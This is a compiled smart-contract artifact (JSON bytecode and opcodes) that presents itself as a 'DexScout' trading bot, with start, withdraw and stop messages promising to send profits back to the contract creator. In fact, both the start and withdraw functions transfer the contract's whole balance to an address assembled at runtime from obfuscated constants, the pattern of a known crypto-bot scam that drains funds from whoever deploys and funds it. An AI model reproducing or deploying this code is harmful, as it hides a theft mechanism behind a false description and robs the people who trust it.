{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561000f575f80fd5b50610e5a8061001d5f395ff3fe608060405260043610610037575f3560e01c80631b55ba3a1461004257806370e44c6a1461004c578063bedf0f4a146100565761003e565b3661003e57005b5f80fd5b61004a610060565b005b6100546100e2565b005b61005e610164565b005b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab60405161008d906109e4565b60405180910390a161009d61019b565b73ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f193505050501580156100df573d5f803e3d5ffd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab60405161010f90610a72565b60405180910390a161011f6101b1565b73ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f19350505050158015610161573d5f803e3d5ffd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab60405161019190610ada565b60405180910390a1565b5f6101ac6101a76101c7565b610307565b905090565b5f6101c26101bd6101c7565b610307565b905090565b60605f6101d26105d2565b90505f6270083f90505f63e5b41d9390505f6101ec6105dc565b90505f6101f76105e6565b90505f6102486040518060400160405280600181526020017f780000000000000000000000000000000000000000000000000000000000000081525061024361023e6105f1565b6105fc565b61071d565b90505f61025d82610258896105fc565b61071d565b90505f61027a61026c886105fc565b610275886105fc565b61071d565b90505f610286866105fc565b90505f610292866105fc565b90505f6102b16102a2868661071d565b6102ac858561071d565b61071d565b90505f6102f36040518060400160405280600181526020017f30000000000000000000000000000000000000000000000000000000000000008152508361071d565b9050809c5050505050505050505050505090565b5f808290505f80805f600290505b602a8110156105c5576101008461032c9190610b44565b935084818151811061034157610340610b85565b5b602001015160f81c60f81b60f81c60ff169250846001826103629190610bbb565b8151811061037357610372610b85565b5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff16101580156103c4575060668373ffffffffffffffffffffffffffffffffffffffff1611155b156103dd576057836103d69190610bee565b9250610489565b60418373ffffffffffffffffffffffffffffffffffffffff161015801561041b575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156104345760378361042d9190610bee565b9250610488565b60308373ffffffffffffffffffffffffffffffffffffffff1610158015610472575060398373ffffffffffffffffffffffffffffffffffffffff1611155b15610487576030836104849190610bee565b92505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff16101580156104c7575060668273ffffffffffffffffffffffffffffffffffffffff1611155b156104e0576057826104d99190610bee565b915061058c565b60418273ffffffffffffffffffffffffffffffffffffffff161015801561051e575060468273ffffffffffffffffffffffffffffffffffffffff1611155b15610537576037826105309190610bee565b915061058b565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610575575060398273ffffffffffffffffffffffffffffffffffffffff1611155b1561058a576030826105879190610bee565b91505b5b5b8160108461059a9190610b44565b6105a49190610c35565b846105af9190610c35565b93506002816105be9190610bbb565b9050610315565b5082945050505050919050565b5f623e1c9a905090565b5f620f7de0905090565b5f63af95910d905090565b5f630d19b575905090565b60605f808390505b5f811461062d57818061061690610c7c565b9250506010816106269190610cf0565b9050610604565b5f8267ffffffffffffffff81111561064857610647610d20565b5b6040519080825280601f01601f19166020018201604052801561067a5781602001600182028036833780820191505090505b5090505f5b83811015610711576010866106949190610d4d565b925061069f836108a3565b82600183876106ae9190610d7d565b6106b89190610d7d565b815181106106c9576106c8610b85565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690815f1a9053506010866107049190610cf0565b955080600101905061067f565b50809350505050919050565b60605f8390505f8390505f815183516107369190610bbb565b67ffffffffffffffff81111561074f5761074e610d20565b5b6040519080825280601f01601f1916602001820160405280156107815781602001600182028036833780820191505090505b5090505f8190505f805f91505b855182101561080f578582815181106107aa576107a9610b85565b5b602001015160f81c60f81b8382806107c190610c7c565b9350815181106107d4576107d3610b85565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690815f1a905350818060010192505061078e565b5f91505b84518210156108945784828151811061082f5761082e610b85565b5b602001015160f81c60f81b83828061084690610c7c565b93508151811061085957610858610b85565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690815f1a9053508180600101925050610813565b82965050505050505092915050565b5f8160ff165f111580156108bb575060098260ff1611155b156108f957817f300000000000000000000000000000000000000000000000000000000000000060f81c6108ef9190610dbc565b60f81b905061095f565b8160ff16600a111580156109115750600f8260ff1611155b1561095b57600a827f610000000000000000000000000000000000000000000000000000000000000060f81c6109479190610dbc565b6109519190610df0565b60f81b905061095f565b5f80fd5b919050565b5f82825260208201905092915050565b7f52756e6e696e672044657853636f757420616374696f6e2e20546869732063615f8201527f6e2074616b652061207768696c653b20706c6561736520776169742e2e000000602082015250565b5f6109ce603d83610964565b91506109d982610974565b604082019050919050565b5f6020820190508181035f8301526109fb816109c2565b9050919050565b7f53656e64696e672070726f66697473206261636b20746f20636f6e74726163745f8201527f2063726561746f7220616464726573732e2e2e00000000000000000000000000602082015250565b5f610a5c603383610964565b9150610a6782610a02565b604082019050919050565b5f6020820190508181035f830152610a8981610a50565b9050919050565b7f53746f7070696e6720636f6e747261637420626f742e2e2e00000000000000005f82015250565b5f610ac4601883610964565b9150610acf82610a90565b602082019050919050565b5f6020820190508181035f830152610af181610ab8565b9050919050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f610b4e82610af8565b9150610b5983610af8565b9250828202610b6781610af8565b91508282048414831517610b7e57610b7d610b17565b5b5092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f819050919050565b5f610bc582610bb2565b9150610bd083610bb2565b9250828201905080821115610be857610be7610b17565b5b92915050565b5f610bf882610af8565b9150610c0383610af8565b9250828203905073ffffffffffffffffffffffffffffffffffffffff811115610c2f57610c2e610b17565b5b92915050565b5f610c3f82610af8565b9150610c4a83610af8565b9250828201905073ffffffffffffffffffffffffffffffffffffffff811115610c7657610c75610b17565b5b92915050565b5f610c8682610bb2565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203610cb857610cb7610b17565b5b600182019050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f610cfa82610bb2565b9150610d0583610bb2565b925082610d1557610d14610cc3565b5b828204905092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b5f610d5782610bb2565b9150610d6283610bb2565b925082610d7257610d71610cc3565b5b828206905092915050565b5f610d8782610bb2565b9150610d9283610bb2565b9250828203905081811115610daa57610da9610b17565b5b92915050565b5f60ff82169050919050565b5f610dc682610db0565b9150610dd183610db0565b9250828201905060ff811115610dea57610de9610b17565b5b92915050565b5f610dfa82610db0565b9150610e0583610db0565b9250828203905060ff811115610e1e57610e1d610b17565b5b9291505056fea2646970667358221220565c394eff6d1b9e27f09d2b6bc3e3f8cf530b45f037e8fe659e7be060dd29f364736f6c63430008180033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xE5A DUP1 PUSH2 0x1D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x37 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1B55BA3A EQ PUSH2 0x42 JUMPI DUP1 PUSH4 0x70E44C6A EQ PUSH2 0x4C JUMPI DUP1 PUSH4 0xBEDF0F4A EQ PUSH2 0x56 JUMPI PUSH2 0x3E JUMP JUMPDEST CALLDATASIZE PUSH2 0x3E JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x4A PUSH2 0x60 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x54 PUSH2 0xE2 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x5E PUSH2 0x164 JUMP JUMPDEST STOP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x8D SWAP1 PUSH2 0x9E4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x9D PUSH2 0x19B JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0xDF JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x10F SWAP1 PUSH2 0xA72 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x11F PUSH2 0x1B1 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x161 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD PUSH2 0x191 SWAP1 PUSH2 0xADA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMP JUMPDEST PUSH0 PUSH2 0x1AC PUSH2 0x1A7 PUSH2 0x1C7 JUMP JUMPDEST PUSH2 0x307 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH2 0x1C2 PUSH2 0x1BD PUSH2 0x1C7 JUMP JUMPDEST PUSH2 0x307 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 PUSH2 0x1D2 PUSH2 0x5D2 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0x70083F SWAP1 POP PUSH0 PUSH4 0xE5B41D93 SWAP1 POP PUSH0 PUSH2 0x1EC PUSH2 0x5DC JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x1F7 PUSH2 0x5E6 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x248 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x243 PUSH2 0x23E PUSH2 0x5F1 JUMP JUMPDEST PUSH2 0x5FC JUMP JUMPDEST PUSH2 0x71D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x25D DUP3 PUSH2 0x258 DUP10 PUSH2 0x5FC JUMP JUMPDEST PUSH2 0x71D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x27A PUSH2 0x26C DUP9 PUSH2 0x5FC JUMP JUMPDEST PUSH2 0x275 DUP9 PUSH2 0x5FC JUMP JUMPDEST PUSH2 0x71D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x286 DUP7 PUSH2 0x5FC JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x292 DUP7 PUSH2 0x5FC JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x2B1 PUSH2 0x2A2 DUP7 DUP7 PUSH2 0x71D JUMP JUMPDEST PUSH2 0x2AC DUP6 DUP6 PUSH2 0x71D JUMP JUMPDEST PUSH2 0x71D JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x2F3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x71D JUMP JUMPDEST SWAP1 POP DUP1 SWAP13 POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 DUP3 SWAP1 POP PUSH0 DUP1 DUP1 PUSH0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x5C5 JUMPI PUSH2 0x100 DUP5 PUSH2 0x32C SWAP2 SWAP1 PUSH2 0xB44 JUMP JUMPDEST SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x341 JUMPI PUSH2 0x340 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 PUSH2 0x362 SWAP2 SWAP1 PUSH2 0xBBB JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x373 JUMPI PUSH2 0x372 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x3C4 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x3DD JUMPI PUSH1 0x57 DUP4 PUSH2 0x3D6 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP3 POP PUSH2 0x489 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x41B JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x434 JUMPI PUSH1 0x37 DUP4 PUSH2 0x42D SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP3 POP PUSH2 0x488 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x472 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x487 JUMPI PUSH1 0x30 DUP4 PUSH2 0x484 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x4C7 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x4E0 JUMPI PUSH1 0x57 DUP3 PUSH2 0x4D9 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP2 POP PUSH2 0x58C JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x51E JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x537 JUMPI PUSH1 0x37 DUP3 PUSH2 0x530 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP2 POP PUSH2 0x58B JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x575 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x58A JUMPI PUSH1 0x30 DUP3 PUSH2 0x587 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 PUSH2 0x59A SWAP2 SWAP1 PUSH2 0xB44 JUMP JUMPDEST PUSH2 0x5A4 SWAP2 SWAP1 PUSH2 0xC35 JUMP JUMPDEST DUP5 PUSH2 0x5AF SWAP2 SWAP1 PUSH2 0xC35 JUMP JUMPDEST SWAP4 POP PUSH1 0x2 DUP2 PUSH2 0x5BE SWAP2 SWAP1 PUSH2 0xBBB JUMP JUMPDEST SWAP1 POP PUSH2 0x315 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH3 0x3E1C9A SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH3 0xF7DE0 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH4 0xAF95910D SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH4 0xD19B575 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH0 DUP2 EQ PUSH2 0x62D JUMPI DUP2 DUP1 PUSH2 0x616 SWAP1 PUSH2 0xC7C JUMP JUMPDEST SWAP3 POP POP PUSH1 0x10 DUP2 PUSH2 0x626 SWAP2 SWAP1 PUSH2 0xCF0 JUMP JUMPDEST SWAP1 POP PUSH2 0x604 JUMP JUMPDEST PUSH0 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x648 JUMPI PUSH2 0x647 PUSH2 0xD20 JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x67A JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x711 JUMPI PUSH1 0x10 DUP7 PUSH2 0x694 SWAP2 SWAP1 PUSH2 0xD4D JUMP JUMPDEST SWAP3 POP PUSH2 0x69F DUP4 PUSH2 0x8A3 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 PUSH2 0x6AE SWAP2 SWAP1 PUSH2 0xD7D JUMP JUMPDEST PUSH2 0x6B8 SWAP2 SWAP1 PUSH2 0xD7D JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x6C9 JUMPI PUSH2 0x6C8 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 PUSH2 0x704 SWAP2 SWAP1 PUSH2 0xCF0 JUMP JUMPDEST SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x67F JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP4 SWAP1 POP PUSH0 DUP4 SWAP1 POP PUSH0 DUP2 MLOAD DUP4 MLOAD PUSH2 0x736 SWAP2 SWAP1 PUSH2 0xBBB JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x74F JUMPI PUSH2 0x74E PUSH2 0xD20 JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x781 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 DUP2 SWAP1 POP PUSH0 DUP1 PUSH0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0x80F JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x7AA JUMPI PUSH2 0x7A9 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x7C1 SWAP1 PUSH2 0xC7C JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x7D4 JUMPI PUSH2 0x7D3 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x78E JUMP JUMPDEST PUSH0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0x894 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x82F JUMPI PUSH2 0x82E PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x846 SWAP1 PUSH2 0xC7C JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x859 JUMPI PUSH2 0x858 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x813 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 PUSH1 0xFF AND PUSH0 GT ISZERO DUP1 ISZERO PUSH2 0x8BB JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x8F9 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0x8EF SWAP2 SWAP1 PUSH2 0xDBC JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0x95F JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0x911 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x95B JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0x947 SWAP2 SWAP1 PUSH2 0xDBC JUMP JUMPDEST PUSH2 0x951 SWAP2 SWAP1 PUSH2 0xDF0 JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0x95F JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x52756E6E696E672044657853636F757420616374696F6E2E2054686973206361 PUSH0 DUP3 ADD MSTORE PUSH32 0x6E2074616B652061207768696C653B20706C6561736520776169742E2E000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x9CE PUSH1 0x3D DUP4 PUSH2 0x964 JUMP JUMPDEST SWAP2 POP PUSH2 0x9D9 DUP3 PUSH2 0x974 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x9FB DUP2 PUSH2 0x9C2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x53656E64696E672070726F66697473206261636B20746F20636F6E7472616374 PUSH0 DUP3 ADD MSTORE PUSH32 0x2063726561746F7220616464726573732E2E2E00000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xA5C PUSH1 0x33 DUP4 PUSH2 0x964 JUMP JUMPDEST SWAP2 POP PUSH2 0xA67 DUP3 PUSH2 0xA02 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xA89 DUP2 PUSH2 0xA50 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x53746F7070696E6720636F6E747261637420626F742E2E2E0000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xAC4 PUSH1 0x18 DUP4 PUSH2 0x964 JUMP JUMPDEST SWAP2 POP PUSH2 0xACF DUP3 PUSH2 0xA90 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xAF1 DUP2 PUSH2 0xAB8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xB4E DUP3 PUSH2 0xAF8 JUMP JUMPDEST SWAP2 POP PUSH2 0xB59 DUP4 PUSH2 0xAF8 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 0xB67 DUP2 PUSH2 0xAF8 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 0xB7E JUMPI PUSH2 0xB7D PUSH2 0xB17 JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xBC5 DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH2 0xBD0 DUP4 PUSH2 0xBB2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0xBE8 JUMPI PUSH2 0xBE7 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xBF8 DUP3 PUSH2 0xAF8 JUMP JUMPDEST SWAP2 POP PUSH2 0xC03 DUP4 PUSH2 0xAF8 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xC2F JUMPI PUSH2 0xC2E PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP 